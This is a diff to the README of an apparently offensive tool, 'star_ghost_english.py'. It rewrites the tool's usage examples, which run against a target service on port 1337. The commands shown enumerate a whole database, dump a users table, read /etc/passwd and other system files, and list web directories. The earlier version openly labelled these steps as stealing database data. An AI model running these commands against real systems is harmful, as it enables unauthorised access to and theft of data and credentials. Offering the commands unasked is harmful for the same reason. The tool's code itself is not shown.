@@ -16,14 +16,23 @@ pip install requests
 chmod +x star_ghost_english.py
 ```
 
-Basic Usage
-```
+# Basic Usage
+
+```bash
 # Full database enumeration
 python3 star_ghost_english.py -u http://target:1337 -a your-app-id
 
-# Read system files
+# Enumerate specific table
+python3 star_ghost_english.py -u http://target:1337 -a your-app-id -t users
+
+# Read specific file
 python3 star_ghost_english.py -u http://target:1337 -a your-app-id -f /etc/passwd
 
-# Steal database data
-python3 star_ghost_english.py -u http://target:1337 -a your-app-id -t users
-```
+# List directory contents
+python3 star_ghost_english.py -u http://target:1337 -a your-app-id -d /var/www
+
+# Read common system files
+python3 star_ghost_english.py -u http://target:1337 -a your-app-id --read-system
+
+# Enumerate specific schema
+python3 star_ghost_english.py -u http://target:1337 -a your-app-id -s custom_schema
